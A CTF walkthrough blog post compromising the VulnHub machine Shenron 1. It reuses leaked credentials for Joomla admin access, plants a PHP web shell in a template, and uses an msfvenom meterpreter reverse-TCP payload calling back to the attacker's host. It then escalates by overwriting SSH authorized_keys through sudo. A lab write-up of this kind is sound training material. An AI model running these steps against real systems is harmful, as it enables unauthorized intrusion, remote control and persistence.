---
title: CTF Walkthrough for VulnHub Machine Shenron 1
date: 2024-08-30 00:00:00 +0300
categories: [Walkthrough, CTF]
tags: [vulnhub, writeup, shenron, machines, pentest]   
author: christ
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about Shenron 1 which is the first machine of the Vulnhub Shenron series machines. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
This machine was set up using VirtualBox as recommended by the creator and the Network configuration was changed to 'Nat Network'.
### Description
Name: Shenron 1<br>
Goal: Get two flags<br>
Difficulty: Beginner to Intermediate<br>
Operating System: Linux<br>
Download link: [Shenron-1](https://download.vulnhub.com/shenron/shenron-1.ova)<br>
### Tools used
*Nmap<br>
*Zaproxy<br>
*Netcat<br>
*Metasploit<br>
### Environment Set up
To be succ<br>

## Reconnaissance
As in every penetration test, we need to identify our target on the network. We can do this by launching a quick host discovery scan against the network using Nmap. To perform the host verification we need to know our current subnet. We can perform this using the commands below:<br>
Current subnet identification: ```bash ip a```<br>
Host discovery scan: ```sudo nmap -sn 10.0.2.15/24```<br><br>
![Host Identification](https://github.com/ChristElise/christelise.github.io/blob/main/assets/img/posts/walthrough/vulnhub/2024-09-02--shenron%3A1/target-dis.png)

After identifying our target on the network we need to know what services are run by our target to create different possible attack scenarios. We can start a service scan on our target using Nmap with the command ```sudo nmap -sV -sC  10.0.2.4 -oA services-dis```
![Service Scan]()

We can see that the target is running both an SSH server and an Apache web server. Web applications are known to contain many vulnerabilities so let's browse to the web application for further analyses. Unfortunately for us, we fall on the default Apache
![Wep App Index Page]()

In the real-world scenario, the default page might be left temporarily during the setup or testing phases of the web application. So let's try to find any hidden directories in the web application. I performed the fuzzing here using **ffuf** it can be done using your tool of preference.
Command used: ```ffuf -ic -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.0.2.4/FUZZ```
![Directory Fuzzing]()

The fuzzing process can uncover two interesting directories which are *test* and *joomla*. The directory joomla already gives us a hint that the web application may be running the well-known CMS Joomla. Let's browse these directories chronologically as the appeared during our fuzzing.
Browsing to the *test* directory we notice that directory listing is enabled which is a vulnerability in itself. We can note this vulnerability in our *Findings* folder. 
![Directory Listing]()
We can also see a file having an interesting name i.e. *password*, accessing the file from our command line reveals to us a pair of credentials belonging to a certain admin user.
![File Accessed]()

Nex let's visit the second directory *joomla* uncovered during our fuzzing. We can see that our target runs the well-known Joomla CMS. Remember that we uncover credentials hidden in the comments of the password file so, let's try this credential against the Joomla instance to check if they are valid.
*NB: Login to the administrative interface on Joomla is done by default in the **administrator** directory.*
![Joomla Login]()

## Exploitation
We can see that we successfully login as the admin. We can now attempt to add a PHP shell to one PHP file in an unused template. Here, we will choose the protostar template and add our basic PHP shell ```system($_GET["cmd"]);``` to the error.php file.
*NB: In a real-world penetration test try to use a more complicated name such as a hash for the GET parameter value. Anyone can access that file hence if a common name is used attackers may bruteforce it and also use to to establish their foothold in your client environtment.*
![Template Modification]()
After modifying our template we can now execute commands on our target. ```curl http://10.0.2.4/joomla/templates/protostar/error.php?cmd=id```
![RCE Test]()

This web shell is good but to facilitate our work, we will employ Meterpreter, a sophisticated payload integrated into the Metasploit Framework. To use a meterpreter on our target we first need to craft one using the msfvenom tool from the Metasploit Framework.
```msfvenom -p linux/x64/meterpreter_reverse_tcp  LHOST=10.0.2.15 LPORT=4444 -f elf > update.elf```
![Payload Crafting]()
Now after crafting our payload we then start a small HTTP server to transfer the payload to our target using Python3 http.server module.
![Python Server]()

We then use *wget* on our target to download to download the payload to the */tmp* directory.
![Download Operation]()
Before executing our payload we need to configure our listener in Metasploit.
![Metasploit Set Up]()
After starting our listener we can now give execution permission to our payload and execute it.
![Payload Execution]()
Going back to the listener, we can see that we caught a shell.
![Catching Shell]()
After obtaining a shell as the web user it's a good habit to search for the *web.config* file in the web root directory which may contain credentials for the database user.<br> *NB: The name of this file may change depending on the preference of the web administrator.*
![Web Config File]()
![DB User Creds]()
We see that the credentials belong to the user **jenny** who is also a user on the target machine so let's try to authenticate as the user jenny.<br>
*Tip: To enumerate users on the system just cat the content of the /etc/passwd file*
![User Auth]()

We have identified that the user is susceptible to vulnerabilities arising from password reuse. With this password, we can directly try to identify if the user has any sudo rights.
![Sudo Right]()

Great we see that the user Jenny can perform copy operations by using Shenron identity. Since we observed an SSH service running during our service enumeration let's try to replace the SSH key of Shenron by using the privileges offer to us by the sudo command.
We can generate a key pair \(private, public\) on our attack host and upload the public key using the same method used above or upload it using our powerful meterpreter.
![SSH Key Gen]()
After uploading the public key we can now replace the **authorized_keys** file in Shenron's **.ssh** directory by impersonating Shenron using our sudo rights and then afterward attempt using the private key to login as Shenron
![SSH Key Replace]()
![SSH Login]()








